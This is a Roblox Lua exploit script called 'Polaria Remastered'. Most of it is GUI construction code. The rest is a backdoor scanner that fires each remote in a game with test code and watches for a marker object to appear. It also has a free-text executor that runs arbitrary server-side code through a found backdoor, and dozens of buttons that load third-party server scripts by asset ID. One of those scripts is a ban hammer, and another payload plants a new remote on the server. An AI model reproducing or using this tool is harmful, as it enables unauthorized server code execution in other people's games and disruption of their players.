UI["UICorner_4d"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_4e"] = Instance.new("UIGradient", UI["HomeTab_4c"]);
UI["UIGradient2_4e"]["Name"] = "UIGradient2"
UI["UIGradient2_4e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_4f"] = Instance.new("UIStroke", UI["HomeTab_4c"]);
UI["UIStroke_4f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_4f"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_50"] = Instance.new("UIGradient", UI["UIStroke_4f"]);
UI["UIGradient_50"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIListLayout_51"] = Instance.new("UIListLayout", UI["Tabs_41"]);
UI["UIListLayout_51"]["HorizontalAlignment"] = Enum.HorizontalAlignment.Center;
UI["UIListLayout_51"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
UI["UIListLayout_51"]["VerticalFlex"] = Enum.UIFlexAlignment.Fill;
UI["UIListLayout_51"]["Padding"] = UDim.new(0, 6);
UI["UIListLayout_51"]["VerticalAlignment"] = Enum.VerticalAlignment.Center;
UI["UIListLayout_51"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
UI["UIListLayout_51"]["FillDirection"] = Enum.FillDirection.Horizontal;


UI["CreditsTab_52"] = Instance.new("TextButton", UI["Tabs_41"]);
UI["CreditsTab_52"]["TextWrapped"] = true;
UI["CreditsTab_52"]["BorderSizePixel"] = 0;
UI["CreditsTab_52"]["TextScaled"] = true;
UI["CreditsTab_52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["CreditsTab_52"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["CreditsTab_52"]["BackgroundTransparency"] = 1;
UI["CreditsTab_52"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["CreditsTab_52"]["LayoutOrder"] = 5;
UI["CreditsTab_52"]["Text"] = "Credits"
UI["CreditsTab_52"]["Name"] = "CreditsTab"
UI["CreditsTab_52"]["Position"] = UDim2.new(0, 390, 0, 4);


UI["UICorner_53"] = Instance.new("UICorner", UI["CreditsTab_52"]);
UI["UICorner_53"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_54"] = Instance.new("UIGradient", UI["CreditsTab_52"]);
UI["UIGradient2_54"]["Name"] = "UIGradient2"
UI["UIGradient2_54"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_55"] = Instance.new("UIStroke", UI["CreditsTab_52"]);
UI["UIStroke_55"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_55"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_56"] = Instance.new("UIGradient", UI["UIStroke_55"]);
UI["UIGradient_56"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["ExeTab_57"] = Instance.new("TextButton", UI["Tabs_41"]);
UI["ExeTab_57"]["TextWrapped"] = true;
UI["ExeTab_57"]["BorderSizePixel"] = 0;
UI["ExeTab_57"]["TextScaled"] = true;
UI["ExeTab_57"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["ExeTab_57"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["ExeTab_57"]["BackgroundTransparency"] = 1;
UI["ExeTab_57"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["ExeTab_57"]["LayoutOrder"] = 4;
UI["ExeTab_57"]["Text"] = "Executor"
UI["ExeTab_57"]["Name"] = "ExeTab"
UI["ExeTab_57"]["Position"] = UDim2.new(0, 390, 0, 4);


UI["UICorner_58"] = Instance.new("UICorner", UI["ExeTab_57"]);
UI["UICorner_58"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_59"] = Instance.new("UIGradient", UI["ExeTab_57"]);
UI["UIGradient2_59"]["Name"] = "UIGradient2"
UI["UIGradient2_59"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["UIStroke_5a"] = Instance.new("UIStroke", UI["ExeTab_57"]);
UI["UIStroke_5a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_5a"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_5b"] = Instance.new("UIGradient", UI["UIStroke_5a"]);
UI["UIGradient_5b"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["Hide_5c"] = Instance.new("TextButton", UI["MainFrame_7"]);
UI["Hide_5c"]["TextWrapped"] = true;
UI["Hide_5c"]["BorderSizePixel"] = 0;
UI["Hide_5c"]["TextScaled"] = true;
UI["Hide_5c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Hide_5c"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Hide_5c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Hide_5c"]["BackgroundTransparency"] = 1;
UI["Hide_5c"]["Size"] = UDim2.new(0, 32, 0, 32);
UI["Hide_5c"]["Text"] = "-"
UI["Hide_5c"]["Name"] = "Hide"
UI["Hide_5c"]["Position"] = UDim2.new(0, 440, 0, 4);


UI["UICorner_5d"] = Instance.new("UICorner", UI["Hide_5c"]);
UI["UICorner_5d"]["CornerRadius"] = UDim.new(0, 4);


UI["UIGradient2_5e"] = Instance.new("UIGradient", UI["Hide_5c"]);
UI["UIGradient2_5e"]["Name"] = "UIGradient2"
UI["UIGradient2_5e"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};

UI["CreditsContent_61"] = Instance.new("Frame", UI["MainFrame_7"]);
UI["CreditsContent_61"]["Visible"] = false;
UI["CreditsContent_61"]["BorderSizePixel"] = 0;
UI["CreditsContent_61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["CreditsContent_61"]["Size"] = UDim2.new(0, 504, 0, 238);
UI["CreditsContent_61"]["Position"] = UDim2.new(0, 4, 0, 82);
UI["CreditsContent_61"]["Name"] = "CreditsContent"
UI["CreditsContent_61"]["BackgroundTransparency"] = 1;


UI["Stats_62"] = Instance.new("TextLabel", UI["CreditsContent_61"]);
UI["Stats_62"]["TextWrapped"] = true;
UI["Stats_62"]["BorderSizePixel"] = 0;
UI["Stats_62"]["TextSize"] = 22;
UI["Stats_62"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["Stats_62"]["TextYAlignment"] = Enum.TextYAlignment.Top;
UI["Stats_62"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["Stats_62"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Stats_62"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Stats_62"]["BackgroundTransparency"] = 1;
UI["Stats_62"]["Size"] = UDim2.new(0, 410, 0, 236);
UI["Stats_62"]["Text"] = "Fully made by JustAGuest."
UI["Stats_62"]["Name"] = "Stats"
UI["Stats_62"]["Position"] = UDim2.new(0, 94, 0, 0);


UI["UIGradient_63"] = Instance.new("UIGradient", UI["Stats_62"]);
UI["UIGradient_63"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["CreatorHeadshot_64"] = Instance.new("ImageLabel", UI["CreditsContent_61"]);
UI["CreatorHeadshot_64"]["BorderSizePixel"] = 0;
UI["CreatorHeadshot_64"]["ScaleType"] = Enum.ScaleType.Fit;
UI["CreatorHeadshot_64"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
UI["CreatorHeadshot_64"]["Size"] = UDim2.new(0, 90, 0, 90);
UI["CreatorHeadshot_64"]["BackgroundTransparency"] = 1;
UI["CreatorHeadshot_64"]["Name"] = "CreatorHeadshot"


UI["UICorner_65"] = Instance.new("UICorner", UI["CreatorHeadshot_64"]);
UI["UICorner_65"]["CornerRadius"] = UDim.new(0, 99);


UI["UIStroke_66"] = Instance.new("UIStroke", UI["CreatorHeadshot_64"]);
UI["UIStroke_66"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
UI["UIStroke_66"]["Color"] = Color3.fromRGB(255, 255, 255);


UI["UIGradient_67"] = Instance.new("UIGradient", UI["UIStroke_66"]);
UI["UIGradient_67"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};


UI["Title_68"] = Instance.new("TextLabel", UI["MainFrame_7"]);
UI["Title_68"]["TextWrapped"] = true;
UI["Title_68"]["BorderSizePixel"] = 0;
UI["Title_68"]["TextXAlignment"] = Enum.TextXAlignment.Left;
UI["Title_68"]["TextScaled"] = true;
UI["Title_68"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
UI["Title_68"]["FontFace"] = Font.new([[rbxasset://fonts/families/Ubuntu.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
UI["Title_68"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
UI["Title_68"]["BackgroundTransparency"] = 1;
UI["Title_68"]["Size"] = UDim2.new(0, 242, 0, 32);
UI["Title_68"]["Text"] = "Polaria Remastered"
UI["Title_68"]["Name"] = "Title"
UI["Title_68"]["Position"] = UDim2.new(0, 4, 0, 4);


UI["UIGradient_69"] = Instance.new("UIGradient", UI["Title_68"]);
UI["UIGradient_69"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(83, 0, 255)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(160, 0, 255))};

local backdoorRemote = nil
local isDragging = false
local dragStart, startPos

local function Dragify(obj)
    if obj:IsA("Frame") then
        if not obj:FindFirstChildOfClass("UIDragDetector") then
            local d = Instance.new("UIDragDetector")
            d.Parent = obj
        end
        return
    end

    if not (obj:IsA("TextButton") or obj:IsA("ImageButton")) then
        return
    end

    local dragging = false
    local dragStart
    local startPos

    obj.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = obj.Position
        end
    end)

    obj.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
        end
    end)

    UIS.InputChanged:Connect(function(input)
        if dragging and (
            input.UserInputType == Enum.UserInputType.MouseMovement
            or input.UserInputType == Enum.UserInputType.Touch
        ) then
            local delta = input.Position - dragStart
            obj.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)
end

Dragify(UI["MainFrame_7"])
Dragify(UI["Show_2"])

local currentContent = UI["HomeContent_8"]

local function showContent(contentFrame)
    if currentContent then
        currentContent.Visible = false
    end
    contentFrame.Visible = true
    currentContent = contentFrame
end

UI["HomeTab_4c"].MouseButton1Click:Connect(function()
    showContent(UI["HomeContent_8"])
end)

UI["ScanTab_42"].MouseButton1Click:Connect(function()
    showContent(UI["ScannerContent_37"])
end)

UI["ScriptsTab_47"].MouseButton1Click:Connect(function()
    showContent(UI["ScriptsContent_2d"])
end)

UI["ExeTab_57"].MouseButton1Click:Connect(function()
    showContent(UI["ExeContent_11"])
end)

UI["CreditsTab_52"].MouseButton1Click:Connect(function()
    showContent(UI["CreditsContent_61"])
end)

UI["Close_28"].MouseButton1Click:Connect(function()
    UI["ScreenGui_1"]:Destroy()
    getgenv().PolariaRM.isLoaded = false
end)

UI["Hide_5c"].MouseButton1Click:Connect(function()
    UI["MainFrame_7"].Visible = false
    UI["Show_2"].Visible = true
end)

UI["Show_2"].MouseButton1Click:Connect(function()
    UI["MainFrame_7"].Visible = true
    UI["Show_2"].Visible = false
end)

UI["MainFrame_7"].Visible = false
UI["Show_2"].Visible = true

coroutine.wrap(function()
    local headshot = Players:GetUserThumbnailAsync(localPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    UI["UserHeadshot_d"].Image = headshot
end)()

UI["WelcomeLabel_b"].Text = "Welcome to Polaria Remastered, " .. localPlayer.DisplayName .. "!"

local lastDT = 0
RunService.RenderStepped:Connect(function(dt)
    lastDT = dt
end)

local serverStartTime = workspace:GetServerTimeNow()

local function getOS()
    local p = UIS:GetPlatform()
    if p == Enum.Platform.Windows then return "Windows" end
    if p == Enum.Platform.OSX then return "macOS" end
    if p == Enum.Platform.IOS then return "iOS" end
    if p == Enum.Platform.Android then return "Android" end
    if p == Enum.Platform.XBoxOne then return "Xbox" end
    if p == Enum.Platform.PlayStation then return "PlayStation" end
    return "Unknown"
end

local function updateStats()
    local fps = lastDT > 0 and math.floor(1 / lastDT) or 0

    local ping = 0
    local net = Stats:FindFirstChild("Network")
    if net then
        local item = net:FindFirstChild("ServerStatsItem")
        if item and item:FindFirstChild("Data Ping") then
            ping = math.floor(item["Data Ping"]:GetValue())
        end
    end

    local serverAge = math.floor(workspace:GetServerTimeNow() - serverStartTime)

    local device = UIS.TouchEnabled and not UIS.KeyboardEnabled and "Mobile" or "PC"
    local osName = getOS()

    local executor = "Unknown"
    if syn and syn.request then
        executor = "Synapse X"
    elseif KRNL_isLoaded then
        executor = "KRNL"
    elseif fluxus then
        executor = "Fluxus"
    elseif is_sirhurt_closure then
        executor = "SirHurt"
    elseif identifyexecutor then
        executor = identifyexecutor()
    elseif getexecutorname then
        executor = getexecutorname()
    elseif PROTOSMASHER_isLoaded then
        executor = "ProtoSmasher"
    elseif ELECTRON_isLoaded then
        executor = "Electron"
    elseif is_synapse_function then
        executor = "Synapse X"
    end

    UI["Stats_9"].Text =
        "FPS: " .. fps ..
        "\nPing: " .. ping .. "ms" ..
        "\nServer age: " .. serverAge .. "s" ..
        "\nDevice: " .. device ..
        "\nOS: " .. osName ..
        "\nExecutor: " .. executor
end

task.spawn(function()
    while UI["ScreenGui_1"].Parent do
        updateStats()
        task.wait(0.5)
    end
end)

local alphabet = {
    'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
    'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'
}

local function generateName(lenght)
    local text = ''
    for i = 1, lenght do
        text = text .. alphabet[math.random(1, #alphabet)]
    end
    return text
end

local function runRemote(remote, data)
    if remote and remote:IsA('RemoteEvent') then
        remote:FireServer(data)
    elseif remote and remote:IsA('RemoteFunction') then
        spawn(function() 
            remote:InvokeServer(data) 
        end)
    end
end

local function findRemote()
    UI["Status_3e"].Text = "Scanning for backdoors..."
    
    local timee = os.clock()
    local remotes = {}
    local code
    
    local executor = "Unknown"
    
    if syn then
        executor = "Synapse X"
    elseif PROTOSMASHER_isLoaded then
        executor = "ProtoSmasher"
    elseif Krnl then
        executor = "Krnl"
    elseif fluxus then
        executor = "Fluxus"
    elseif is_sirhurt_closure then
        executor = "SirHurt"
    elseif identifyexecutor then
        executor = identifyexecutor()
    end
    
    local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
    local placeId = game.PlaceId
    local player = game:GetService('Players').LocalPlayer
    local playerName = player.Name
    local userId = player.UserId
    local accountAge = player.AccountAge
    
    local protected_backdoor = game:GetService('ReplicatedStorage'):FindFirstChild('lh'..game.PlaceId/6666*1337*game.PlaceId)
    if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then 
                break 
            end
        end
        spawn(function() 
            protected_backdoor:InvokeServer('.', "a=Instance.new('Model',workspace)a.Name='"..code.."'") 
        end)
        remotes[code] = protected_backdoor
    end
    
    for i, remote in game:GetDescendants() do
        if not remote:IsA('RemoteEvent') and not remote:IsA('RemoteFunction') then 
            continue 
        end
        
        if string.split(remote:GetFullName(), '.')[1] == 'RobloxReplicatedStorage' then
            continue
        end
        
        if remote.Parent == game:GetService("ReplicatedStorage") or 
           remote.Parent.Parent == game:GetService("ReplicatedStorage") or 
           remote.Parent.Parent.Parent == game:GetService("ReplicatedStorage") then
            
            if remote:FindFirstChild('__FUNCTION') or remote.Name == '__FUNCTION' then
                continue
            end
            
            if remote.Parent.Parent.Name == 'HDAdminClient' and remote.Parent.Name == 'Signals' then
                continue
            end
            
            if remote.Parent.Name == 'DefaultChatSystemChatEvents' then
                continue
            end
        end
        
        while true do
            code = generateName(math.random(12,30))
            if not remotes[code] then 
                break 
            end
        end
        
        runRemote(remote, "a=Instance.new('Model',workspace)a.Name='"..code.."'")
        remotes[code] = remote
    end
    
    for i = 1, 100 do
        for code, remote in remotes do
            if workspace:FindFirstChild(code) then
                runRemote(remote, "require(171016405.1884*69)")
                
                backdoorRemote = remote
                UI["Status_3e"].Text = "Backdoor found at: " .. remote:GetFullName()
                return remote
            end
        end
        wait()
    end
    
    UI["Status_3e"].Text = "No backdoor found"
    return false
end

UI["ScanTab_38"].MouseButton1Click:Connect(function()
    findRemote()
end)

local function CreateButton(name, code)
    local newButton = UI["ButtonExample_30"]:Clone()
    newButton.Name = name
    newButton.Text = name
    newButton.Visible = true
    newButton.Parent = UI["ScriptsContent_2d"]
    
    newButton.MouseButton1Click:Connect(function()
        if backdoorRemote then
            runRemote(backdoorRemote, code)
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "No backdoor found! Scan first.",
                Duration = 3
            })
        end
    end)
end

CreateButton("Horseman", "require(3737497650).load('" .. localPlayer.Name .. "')")
CreateButton("The Hotline", "require(5813879549).load('" .. localPlayer.Name .. "')")
CreateButton("Potato man", "require(4618428149).load('" .. localPlayer.Name .. "')")
CreateButton("Master chief", "require(5812973403).Halo('" .. localPlayer.Name .. "')")
CreateButton("Oculus", "require(5813695241).load('" .. localPlayer.Name .. "')")
CreateButton("Hypercar", "require(5874393699).load('" .. localPlayer.Name .. "')")
CreateButton("Neon Overlord", "require(5876551530).load('" .. localPlayer.Name .. "')")
CreateButton("Clown Kidnap", "require(5591099977)('" .. localPlayer.Name .. "')")
CreateButton("Thanos", "require(4920151387).load('" .. localPlayer.Name .. "')")
CreateButton("The sun is a deadly lazer", "require(5751710030).Sun('" .. localPlayer.Name .. "')")
CreateButton("Ying yang", "require(4875966146).load('" .. localPlayer.Name .. "')")
CreateButton("Titanium runner", "require(5375511885).Player('" .. localPlayer.Name .. "')")
CreateButton("Crypt", "require(5455352803).crypt('" .. localPlayer.Name .. "')")
CreateButton("Rainbow factory", "require(4823100870).HowRainbowsAreMade('" .. localPlayer.Name .. "')")
CreateButton("Ares the bladist", "require(5813806760).load('" .. localPlayer.Name .. "')")
CreateButton("Visualizer", "require(5684993096).load('" .. localPlayer.Name .. "')")
CreateButton("Hacker X", "require(5641200549).load('" .. localPlayer.Name .. "')")
CreateButton("Fallen angel", "require(4490557105).load('" .. localPlayer.Name .. "')")
CreateButton("Dodge Charger", "require(4697572245).load('" .. localPlayer.Name .. "')")
CreateButton("Soldier", "require(5177488826).Soldier('" .. localPlayer.Name .. "')")
CreateButton("Grab knife", "require(5516594078)('" .. localPlayer.Name .. "')")
CreateButton("Pizza Guy", "require(4657036575).load('" .. localPlayer.Name .. "')")
CreateButton("Darth Vader", "require(5441060212).load('" .. localPlayer.Name .. "')")
CreateButton("Ban hammer", "require(5448035802).Hammer('" .. localPlayer.Name .. "', 'BanHammer')")
CreateButton("Crescendo", "require(4328810253).load('" .. localPlayer.Name .. "')")
CreateButton("Hell Robotics", "require(5813792606).load('" .. localPlayer.Name .. "')")
CreateButton("Cyber knight", "require(5617200606).Cyber('" .. localPlayer.Name .. "')")
CreateButton("Articulacy", "require(5730283203).Articulacy('" .. localPlayer.Name .. "')")
CreateButton("Neptunian V", "require(4453491513).load('" .. localPlayer.Name .. "')")
CreateButton("Obliterator", "require(5375491266).Player('" .. localPlayer.Name .. "')")
CreateButton("Rainbow Stand", "require(5367599184).Dark('" .. localPlayer.Name .. "')")
CreateButton("Tron Bike", "require(4021975182).load('" .. localPlayer.Name .. "')")
CreateButton("Infinity Gauntlet", "require(5375537557).Dark('" .. localPlayer.Name .. "')")
CreateButton("Templar", "require(5313663424).Dark('" .. localPlayer.Name .. "')")
CreateButton("Baseball Bat", "require(4559977647).load('" .. localPlayer.Name .. "')")
CreateButton("Dominus Venari", "require(3256686965).load('" .. localPlayer.Name .. "')")
CreateButton("Blind Reaper", "require(4185644819).a('" .. localPlayer.Name .. "')")
CreateButton("SCP 106", "require(4935275557):Subaru112('" .. localPlayer.Name .. "', 'Subaru112's SCP-106')")
CreateButton("Dubstep Gun", "require(4442010059).load('" .. localPlayer.Name .. "')")
CreateButton("Karambit", "require(5970744588).load('" .. localPlayer.Name .. "')")
CreateButton("Infinite Yield", "require(13716575182)('" .. localPlayer.Name .. "')")
CreateButton("Death Sheriff", "require(6056559552).load('" .. localPlayer.Name .. "')")
CreateButton("Dominus Frigidus", "require(6054361648).load('" .. localPlayer.Name .. "')")
CreateButton("Piano", "require(5983549520).load('" .. localPlayer.Name .. "')")
CreateButton("Chat control gui", "require(5903403087).load('" .. localPlayer.Name .. "')")
CreateButton("Echo", "require(5374597845).Dark('" .. localPlayer.Name .. "')")
CreateButton("KFC", "require(3615713971).load('" .. localPlayer.Name .. "')")
CreateButton("Legake Glove", "require(5187166380)('" .. localPlayer.Name .. "')")
CreateButton("Chainsaw", "require(4560014954).load('" .. localPlayer.Name .. "')")
CreateButton("Dark Eccentric Wrench", "require(5712519660).load('" .. localPlayer.Name .. "')")
CreateButton("Alpha Gattling Gun", "require(5451379778).Gun('" .. localPlayer.Name .. "')")
CreateButton("Frisk", "require(5849995364).load('" .. localPlayer.Name .. "')")
CreateButton("Gentleman Killbot", "require(5430831931).Dark('" .. localPlayer.Name .. "')")
CreateButton("Despacito Mech", "require(4105428725).load('" .. localPlayer.Name .. "')")
CreateButton("Sirenhead", "require(5239955586).Dark('" .. localPlayer.Name .. "')")
CreateButton("Lost Soul", "require(5390158029).Dark('" .. localPlayer.Name .. "')")
CreateButton("Betty Noire", "require(5139373601).load('" .. localPlayer.Name .. "')")
CreateButton("Hallow Slayer", "require(2675506369).hal('" .. localPlayer.Name .. "')")
CreateButton("Skid Beater", "require(3530402272)('" .. localPlayer.Name .. "')")
CreateButton("Chronos Sentinel", "require(3089107241).naenae('" .. localPlayer.Name .. "')")
CreateButton("Pity Hub", "require(3253460334)('" .. localPlayer.Name .. "')")

UI["ButtonExample_30"]:Destroy()

UI["Exe_17"].MouseButton1Click:Connect(function()
    if backdoorRemote and UI["TextBox_24"].Text ~= "" then
        runRemote(backdoorRemote, UI["TextBox_24"].Text)
    elseif not backdoorRemote then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Error",
            Text = "No backdoor found! Scan first.",
            Duration = 3
        })
    end
end)

UI["Clr_12"].MouseButton1Click:Connect(function()
    UI["TextBox_24"].Text = ""
end)

UI["Re_1c"].MouseButton1Click:Connect(function()
    local success, errorMsg = pcall(function()
        if backdoorRemote then
            local Players = game:GetService("Players")
            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local TARGET_USERNAME = Players.LocalPlayer.Name
            
            local RefreshScript = [[
                local ReplicatedStorage = game:GetService("ReplicatedStorage")
                local Players = game:GetService("Players")
                local TARGET_USERNAME = "]] .. TARGET_USERNAME .. [["
                
                local refreshRemote
                if not ReplicatedStorage:FindFirstChild("RefreshCharacterRemote") then
                    refreshRemote = Instance.new("RemoteEvent")
                    refreshRemote.Name = "RefreshCharacterRemote"
                    refreshRemote.Parent = ReplicatedStorage
                else
                    refreshRemote = ReplicatedStorage:FindFirstChild("RefreshCharacterRemote")
                end
                
                refreshRemote.OnServerEvent:Connect(function(player)
                    if player.Name == TARGET_USERNAME then
                        player:LoadCharacter()
                    end
                end)
                
                local function handleExistingPlayer(player)
                    if player.Name == TARGET_USERNAME then
                        task.wait(0.5)
                        player:LoadCharacter()
                    end
                end
                
                for _, player in ipairs(Players:GetPlayers()) do
                    handleExistingPlayer(player)
                end
                
                Players.PlayerAdded:Connect(handleExistingPlayer)
            ]]
            
            runRemote(backdoorRemote, RefreshScript)
        else
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Error",
                Text = "No backdoor found! Scan first.",
                Duration = 3
            })
        end
    end)
    
    if not success then
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Error",
            Text = "Failed to execute: " .. tostring(errorMsg),
            Duration = 3
        })
    end
end)

coroutine.wrap(function()
    local creatorHeadshot = Players:GetUserThumbnailAsync(5592209449, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    UI["CreatorHeadshot_64"].Image = creatorHeadshot
end)()

return UI["ScreenGui_1"]
